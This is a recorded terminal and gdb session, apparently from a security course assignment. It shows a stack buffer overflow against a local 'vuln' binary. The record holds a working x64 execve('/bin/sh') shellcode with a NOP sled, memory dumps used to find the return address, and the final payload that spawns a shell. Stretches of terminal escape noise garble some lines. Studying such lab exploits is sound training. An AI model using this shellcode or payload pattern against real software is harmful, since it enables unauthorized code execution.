0x7fffffffb0c4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb0cc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb0d4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb0dc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb0e4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb0ec:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb0f4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb0fc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb104:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb10c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb114:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb11c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb124:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb12c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb134:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb13c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb144:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb14c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb154:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb15c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb164:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb16c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb174:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb17c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb184:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb18c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
---Type <return> to continue, or q <return> to quit---
0x7fffffffb194:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb19c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb1a4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb1ac:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb1b4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb1bc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb1c4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb1cc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb1d4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb1dc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb1e4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb1ec:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb1f4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb1fc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb204:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb20c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb214:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb21c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb224:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb22c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb234:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb23c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb244:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb24c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb254:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb25c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb264:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb26c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb274:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
---Type <return> to continue, or q <return> to quit---
0x7fffffffb27c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb284:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb28c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb294:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb29c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb2a4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb2ac:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb2b4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb2bc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb2c4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb2cc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb2d4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb2dc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb2e4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb2ec:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb2f4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb2fc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb304:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb30c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb314:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb31c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb324:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb32c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb334:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb33c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb344:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb34c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb354:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb35c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
---Type <return> to continue, or q <return> to quit---
0x7fffffffb364:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb36c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb374:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb37c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb384:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb38c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb394:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb39c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb3a4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb3ac:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb3b4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb3bc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb3c4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb3cc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb3d4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb3dc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb3e4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb3ec:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb3f4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb3fc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb404:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb40c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb414:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb41c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb424:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb42c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb434:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb43c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb444:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
---Type <return> to continue, or q <return> to quit---
0x7fffffffb44c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb454:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb45c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb464:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb46c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb474:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb47c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb484:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb48c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb494:	0x90	0x90	0x90	0x90	0xeb	0x13	0x5f	0x48
0x7fffffffb49c:	0x31	0xc0	0x88	0x47	0x07	0x50	0x48	0x89
0x7fffffffb4a4:	0xe2	0x57	0x48	0x89	0xe6	0xb0	0x3b	0x0f
0x7fffffffb4ac:	0x05	0xe8	0xe8	0xff	0xff	0xff	0x2f	0x62
0x7fffffffb4b4:	0x69	0x6e	0x2f	0x73	0x68	0x90	0x90	0x90
0x7fffffffb4bc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb4c4:	0x90	0x90	0x90	0x90	0x42	0x42	0x42	0x42
0x7fffffffb4cc:	0x00	0x00	0x00	0x00
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) n
Program not restarted.
(gdb) rx/1060xb ($rsp-1060)
[C[C[C[C[C[C[12Pinfo reg
[C[C[C[C[C[Crun $(python -c "print('\x90'*1000+'\xeb\x13\x5f\x48\x31\xc0\x88\x47\x07\x50\x48\x89\xe2\x57\x4
48\x89\xe6\xb0\x3b\x0f\x05\xe8\xe8\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'+'\x90'*15+'BBBB')")[1P')")[1P')")[1P')")[1P')")\')")x')")3')")4')")\')")x')")b')")4')")\')") [A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cx')")
)[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cf')")[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cf')")[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C\')")
x')")
[Cf')")
[C[Cf')")\')")x')")f')")f')")\')")x')")7')")f')")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/hprakash/Desktop/intel/x64/Assignment/vuln $(python -c "print('\x90'*1000+'\xeb\x13\x5f\x48\x31\xc0\x88\x47\x07\x50\x48\x89\xe2\x57\x48\x89\xe6\xb0\x3b\x0f\x05\xe8\xe8\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'+'\x90'*15+'\x34\xb4\xff\xff\xff\x7f')")

Length of Input String:1054


Value of Test:ffffb4a8
Value of filename[0]:ffffb0a0

You are going to need a buffer a little larger than:1032

process 369 is executing new program: /bin/dash
$ 
$ 
$ 
$ 
$ 
$ 
$ 
$ 
$ whoami
hprakash
$ ls
BufferRedirect64.c	    Part4Demo.txt   attack    shellcode.txt  vuln.c
BufferRedirectViaStack64.c  Part4Demo2.txt  attack.c  vuln	     vuln.s
$ exit
[Inferior 1 (process 369) exited normally]
(gdb) quit
]0;hprakash@hprakash-Linux: ~/Desktop/intel/x64/Assignment[01;32mhprakash@hprakash-Linux[00m:[01;34m~/Desktop/intel/x64/Assignment[00m$ 
]0;hprakash@hprakash-Linux: ~/Desktop/intel/x64/Assignment[01;32mhprakash@hprakash-Linux[00m:[01;34m~/Desktop/intel/x64/Assignment[00m$ 
]0;hprakash@hprakash-Linux: ~/Desktop/intel/x64/Assignment[01;32mhprakash@hprakash-Linux[00m:[01;34m~/Desktop/intel/x64/Assignment[00m$ 
]0;hprakash@hprakash-Linux: ~/Desktop/intel/x64/Assignment[01;32mhprakash@hprakash-Linux[00m:[01;34m~/Desktop/intel/x64/Assignment[00m$ 
]0;hprakash@hprakash-Linux: ~/Desktop/intel/x64/Assignment[01;32mhprakash@hprakash-Linux[00m:[01;34m~/Desktop/intel/x64/Assignment[00m$ 
]0;hprakash@hprakash-Linux: ~/Desktop/intel/x64/Assignment[01;32mhprakash@hprakash-Linux[00m:[01;34m~/Desktop/intel/x64/Assignment[00m$ 
]0;hprakash@hprakash-Linux: ~/Desktop/intel/x64/Assignment

Script started on Fri 31 Mar 2017 05:18:26 AM EDT
]0;hprakash@hprakash-Linux: ~/Desktop/intel/x64/Assignment[01;32mhprakash@hprakash-Linux[00m:[01;34m~/Desktop/intel/x64/Assignment[00m$ gdb vuln
GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.04) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from vuln...(no debugging symbols found)...done.
(gdb) run $(python -c "print('\x90'*1000+'\xeb\x13\x5f\x48\x31\xc0\x88\x47\x07\x50\x48\x89\xe2\x57\x 
48\x89\xe6\xb0\x3b\x0f\x05\xe8\xe8\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'+'\x90'*15+'BBBB')")
Starting program: /home/hprakash/Desktop/intel/x64/Assignment/vuln $(python -c "print('\x90'*1000+'\xeb\x13\x5f\x48\x31\xc0\x88\x47\x07\x50\x48\x89\xe2\x57\x48\x89\xe6\xb0\x3b\x0f\x05\xe8\xe8\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'+'\x90'*15+'BBBB')")

Length of Input String:1052


Value of Test:ffffb4b8
Value of filename[0]:ffffb0b0

You are going to need a buffer a little larger than:1032


Program received signal SIGSEGV, Segmentation fault.
0x0000000042424242 in ?? ()
(gdb) info reg
rax            0x7fffffffb0b0	140737488335024
rbx            0x0	0
rcx            0x9090909090909090	-8029759185026510704
rdx            0x42424242909090	18650200814948496
rsi            0x7fffffffe420	140737488348192
rdi            0x7fffffffb4bf	140737488336063
rbp            0x9090909090909090	0x9090909090909090
rsp            0x7fffffffb4d0	0x7fffffffb4d0
r8             0x0	0
r9             0x3b	59
r10            0x5d	93
r11            0x7ffff7b95128	140737349505320
r12            0x400500	4195584
r13            0x7fffffffdce0	140737488346336
r14            0x0	0
r15            0x0	0
rip            0x42424242	0x42424242
eflags         0x10202	[ IF RF ]
cs             0x33	51
ss             0x2b	43
ds             0x0	0
es             0x0	0
fs             0x0	0
gs             0x0	0
(gdb) x/1060xb ($rsp-1060)
0x7fffffffb0ac:	0xff	0x7f	0x00	0x00	0x90	0x90	0x90	0x90
0x7fffffffb0b4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb0bc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb0c4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb0cc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb0d4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb0dc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb0e4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb0ec:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb0f4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb0fc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb104:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb10c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb114:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb11c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb124:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb12c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb134:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb13c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb144:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb14c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb154:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb15c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb164:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb16c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb174:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb17c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb184:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb18c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
---Type <return> to continue, or q <return> to quit---
0x7fffffffb194:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb19c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb1a4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb1ac:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb1b4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb1bc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb1c4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb1cc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb1d4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb1dc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb1e4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb1ec:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb1f4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb1fc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb204:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb20c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb214:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb21c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb224:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb22c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb234:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb23c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb244:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb24c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb254:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb25c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb264:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb26c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb274:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
---Type <return> to continue, or q <return> to quit---
0x7fffffffb27c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb284:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb28c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb294:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb29c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb2a4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb2ac:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb2b4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb2bc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb2c4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb2cc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb2d4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb2dc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb2e4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb2ec:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb2f4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb2fc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb304:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb30c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb314:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb31c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb324:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb32c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb334:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb33c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb344:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb34c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb354:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb35c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
---Type <return> to continue, or q <return> to quit---
0x7fffffffb364:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb36c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb374:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb37c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb384:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb38c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb394:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb39c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb3a4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb3ac:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb3b4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb3bc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb3c4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb3cc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb3d4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb3dc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb3e4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb3ec:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb3f4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb3fc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb404:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb40c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb414:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb41c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb424:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb42c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb434:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb43c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb444:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
---Type <return> to continue, or q <return> to quit---
0x7fffffffb44c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb454:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb45c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb464:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb46c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb474:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb47c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb484:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb48c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb494:	0x90	0x90	0x90	0x90	0xeb	0x13	0x5f	0x48
0x7fffffffb49c:	0x31	0xc0	0x88	0x47	0x07	0x50	0x48	0x89
0x7fffffffb4a4:	0xe2	0x57	0x48	0x89	0xe6	0xb0	0x3b	0x0f
0x7fffffffb4ac:	0x05	0xe8	0xe8	0xff	0xff	0xff	0x2f	0x62
